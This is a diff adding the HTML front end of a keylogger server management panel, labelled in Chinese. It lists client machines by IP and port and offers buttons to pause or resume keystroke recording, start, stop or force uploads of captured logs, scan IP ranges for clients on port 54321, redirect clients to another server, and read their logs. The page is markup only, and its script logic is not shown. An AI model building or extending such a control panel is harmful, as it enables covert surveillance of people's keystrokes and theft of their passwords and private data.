@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger 服务器管理</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+        }
+
+        .connection-status {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #e74c3c;
+        }
+
+        .status-dot.connected {
+            background: #2ecc71;
+        }
+
+        .container {
+            display: flex;
+            height: calc(100vh - 60px);
+        }
+
+        .sidebar {
+            width: 250px;
+            background: white;
+            border-right: 1px solid #ddd;
+            padding: 1rem;
+        }
+
+        .sidebar h3 {
+            margin-bottom: 1rem;
+            color: #666;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+        }
+
+        .nav-item {
+            padding: 0.75rem 1rem;
+            margin-bottom: 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .nav-item:hover {
+            background: #f0f0f0;
+        }
+
+        .nav-item.active {
+            background: #3498db;
+            color: white;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 2rem;
+            overflow-y: auto;
+        }
+
+        .toolbar {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #3498db;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #2980b9;
+        }
+
+        .btn-success {
+            background: #2ecc71;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #27ae60;
+        }
+
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+
+        .btn-warning {
+            background: #f39c12;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background: #e67e22;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        input[type="text"], input[type="number"] {
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .card h3 {
+            margin-bottom: 1rem;
+            color: #2c3e50;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            padding: 0.75rem;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+
+        th {
+            font-weight: 600;
+            color: #666;
+            background: #f8f9fa;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .status-badge {
+            padding: 0.25rem 0.5rem;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .status-online {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-offline {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .status-recording {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .status-paused {
+            background: #e2e3e5;
+            color: #383d41;
+        }
+
+        .action-btns {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .btn-sm {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.8rem;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .modal-header h3 {
+            margin: 0;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+        }
+
+        .log-viewer {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.85rem;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 1rem;
+        }
+
+        .tab {
+            padding: 0.75rem 1.5rem;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab.active {
+            border-bottom-color: #3498db;
+            color: #3498db;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 3rem;
+            color: #666;
+        }
+
+        .scan-progress {
+            display: none;
+            align-items: center;
+            gap: 0.5rem;
+            color: #666;
+        }
+
+        .scan-progress.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ddd;
+            border-top-color: #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            padding: 1rem 1.5rem;
+            border-radius: 4px;
+            color: white;
+            font-weight: 500;
+            z-index: 2000;
+            transform: translateX(150%);
+            transition: transform 0.3s;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            background: #2ecc71;
+        }
+
+        .toast.error {
+            background: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Keylogger 服务器管理</h1>
+        <div class="connection-status">
+            <div class="status-dot" id="wsStatus"></div>
+            <span id="wsStatusText">未连接</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="sidebar">
+            <h3>菜单</h3>
+            <div class="nav-item active" data-page="clients">客户端管理</div>
+            <div class="nav-item" data-page="logs">日志文件</div>
+            <div class="nav-item" data-page="settings">系统设置</div>
+        </div>
+
+        <div class="main-content">
+            <!-- 客户端管理页面 -->
+            <div id="clientsPage" class="page">
+                <div class="toolbar">
+                    <button class="btn btn-primary" onclick="showConnectModal()">手动连接</button>
+                    <button class="btn btn-success" onclick="showScanModal()">扫描网络</button>
+                    <div class="scan-progress" id="scanProgress">
+                        <div class="spinner"></div>
+                        <span>扫描中...</span>
+                    </div>
+                    <div style="flex: 1;"></div>
+                    <button class="btn btn-warning" onclick="broadcastCommand('pause_record')">全部暂停</button>
+                    <button class="btn btn-success" onclick="broadcastCommand('resume_record')">全部恢复</button>
+                    <button class="btn btn-danger" onclick="broadcastCommand('stop_upload')">全部停止上传</button>
+                </div>
+
+                <div class="card">
+                    <h3>客户端列表</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP 地址</th>
+                                <th>端口</th>
+                                <th>状态</th>
+                                <th>录制</th>
+                                <th>上传</th>
+                                <th>最后连接</th>
+                                <th>操作</th>
+                            </tr>
+                        </thead>
+                        <tbody id="clientsTable">
+                            <tr>
+                                <td colspan="7" class="empty-state">暂无客户端连接</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- 日志文件页面 -->
+            <div id="logsPage" class="page" style="display: none;">
+                <div class="toolbar">
+                    <select id="logClientSelect" class="btn" style="min-width: 150px;">
+                        <option value="">选择客户端</option>
+                    </select>
+                    <input type="text" id="logSearch" placeholder="搜索日志..." style="flex: 1; max-width: 300px;">
+                    <button class="btn btn-primary" onclick="refreshLogs()">刷新</button>
+                </div>
+
+                <div class="card">
+                    <h3>日志文件列表</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>文件名</th>
+                                <th>大小</th>
+                                <th>上传时间</th>
+                                <th>操作</th>
+                            </tr>
+                        </thead>
+                        <tbody id="logsTable">
+                            <tr>
+                                <td colspan="4" class="empty-state">请选择客户端查看日志</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- 系统设置页面 -->
+            <div id="settingsPage" class="page" style="display: none;">
+                <div class="card">
+                    <h3>系统设置</h3>
+                    <div class="form-group">
+                        <label>心跳检测间隔 (毫秒)</label>
+                        <input type="number" id="heartbeatInterval" value="30000" min="5000" step="1000">
+                    </div>
+                    <div class="form-group">
+                        <label>连接超时时间 (毫秒)</label>
+                        <input type="number" id="connectTimeout" value="5000" min="1000" step="500">
+                    </div>
+                    <button class="btn btn-primary" onclick="saveSettings()">保存设置</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 手动连接模态框 -->
+    <div class="modal" id="connectModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>手动连接客户端</h3>
+                <button class="close-btn" onclick="hideModal('connectModal')">&times;</button>
+            </div>
+            <div class="form-group">
+                <label>IP 地址</label>
+                <input type="text" id="connectIp" placeholder="例如: 192.168.1.100">
+            </div>
+            <div class="form-group">
+                <label>端口</label>
+                <input type="number" id="connectPort" value="54321" min="1" max="65535">
+            </div>
+            <button class="btn btn-primary" onclick="manualConnect()">连接</button>
+        </div>
+    </div>
+
+    <!-- 扫描网络模态框 -->
+    <div class="modal" id="scanModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>扫描网络</h3>
+                <button class="close-btn" onclick="hideModal('scanModal')">&times;</button>
+            </div>
+            <div class="form-group">
+                <label>起始 IP</label>
+                <input type="text" id="scanStartIp" placeholder="例如: 192.168.1.1">
+            </div>
+            <div class="form-group">
+                <label>结束 IP</label>
+                <input type="text" id="scanEndIp" placeholder="例如: 192.168.1.254">
+            </div>
+            <div class="form-group">
+                <label>扫描端口 (逗号分隔)</label>
+                <input type="text" id="scanPorts" value="54321" placeholder="例如: 54321,54322">
+            </div>
+            <button class="btn btn-primary" onclick="scanNetwork()">开始扫描</button>
+        </div>
+    </div>
+
+    <!-- 客户端详情模态框 -->
+    <div class="modal" id="clientModal">
+        <div class="modal-content" style="max-width: 700px;">
+            <div class="modal-header">
+                <h3 id="clientModalTitle">客户端详情</h3>
+                <button class="close-btn" onclick="hideModal('clientModal')">&times;</button>
+            </div>
+            <div class="tabs">
+                <div class="tab active" data-tab="overview">概览</div>
+                <div class="tab" data-tab="control">控制</div>
+                <div class="tab" data-tab="logs">日志</div>
+            </div>
+            <div class="tab-content active" id="overviewTab">
+                <div id="clientInfo"></div>
+            </div>
+            <div class="tab-content" id="controlTab">
+                <div class="form-group">
+                    <label>录制控制</label>
+                    <div class="action-btns">
+                        <button class="btn btn-warning" onclick="sendCommand('pause_record')">暂停录制</button>
+                        <button class="btn btn-success" onclick="sendCommand('resume_record')">恢复录制</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>上传控制</label>
+                    <div class="action-btns">
+                        <button class="btn btn-success" onclick="sendCommand('start_upload')">开始上传</button>
+                        <button class="btn btn-danger" onclick="sendCommand('stop_upload')">停止上传</button>
+                        <button class="btn btn-primary" onclick="sendCommand('upload_once')">立即上传</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>服务器配置</label>
+                    <div style="display: flex; gap: 0.5rem;">
+                        <input type="text" id="serverHost" placeholder="服务器 IP">
+                        <input type="number" id="serverPort" placeholder="端口" value="5244" style="width: 100px;">
+                        <button class="btn btn-primary" onclick="setServer()">设置</button>
+                    </div>
+                </div>
+            </div>
+            <div class="tab-content" id="logsTab">
+                <div id="clientLogs"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 日志查看模态框 -->
+    <div class="modal" id="logModal">
+        <div class="modal-content" style="max-width: 900px;">
+            <div class="modal-header">
+                <h3 id="logModalTitle">日志内容</h3>
+                <button class="close-btn" onclick="hideModal('logModal')">&times;</button>
+            </div>
+            <div class="log-viewer" id="logContent"></div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script src="app.js"></script>
+</body>
+</html>
